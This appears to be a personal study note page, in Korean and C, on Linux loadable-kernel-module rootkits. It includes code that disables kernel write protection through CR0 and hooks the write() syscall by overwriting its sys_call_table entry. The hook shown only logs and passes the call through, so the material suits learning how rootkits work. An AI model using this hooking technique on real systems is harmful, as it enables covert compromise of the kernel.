+++
title  = "rootkit"
toc    = true
weight = 0
+++

## LKM
- kernel내 syscall table에 등록된 syscall의 주소를 변조.
- kernel의 syscall 내부에 inline assembly로 구현된어있는 function들에 대한 offset을 변조.

```c
asmlinkage int new_write (unsigned int x, const char __user *y, size_t size) {
  printk(KERN_EMERG "[+] write() hooked.");

  return original_write(x, y, size);
}

static int __init onload(void) {
  char *kernel_version = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);

  printk(KERN_EMERG "Version: %s\n", acquire_kernel_version(kernel_version));

  find_sys_call_table(acquire_kernel_version(kernel_version));

  printk(KERN_EMERG "Syscall table address: %p\n", syscall_table);
  printk(KERN_EMERG "sizeof(unsigned long *): %zx\n", sizeof(unsigned long*));
  printk(KERN_EMERG "sizeof(sys_call_table) : %zx\n", sizeof(syscall_table));

  if (syscall_table != NULL) {
      write_cr0 (read_cr0 () & (~ 0x10000));
      original_write = (void *)syscall_table[__NR_write];
      syscall_table[__NR_write] = &new_write;
      write_cr0 (read_cr0 () | 0x10000);
      printk(KERN_EMERG "[+] onload: sys_call_table hooked\n");
  } else {
      printk(KERN_EMERG "[-] onload: syscall_table is NULL\n");
  }

  kfree(kernel_version);

  return 0;
}
```
